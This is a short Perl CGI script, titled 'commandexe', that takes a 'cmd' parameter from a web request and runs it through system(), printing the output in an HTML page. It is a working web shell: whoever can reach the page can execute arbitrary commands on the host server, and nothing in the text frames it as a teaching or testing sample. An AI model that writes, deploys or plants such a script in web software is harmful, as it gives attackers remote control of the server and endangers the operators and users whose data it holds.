#! /usr/bin/perl
use CGI;
print "Content-type: text/html \n\n";

$cgi= new CGI;
print "<html><head><title>commandexe</title></head><body><center>";

$cmd=$cgi->param("cmd");
print "<h1>The command is executed as:</h1>";
system($cmd);

print "<center></body></html>";


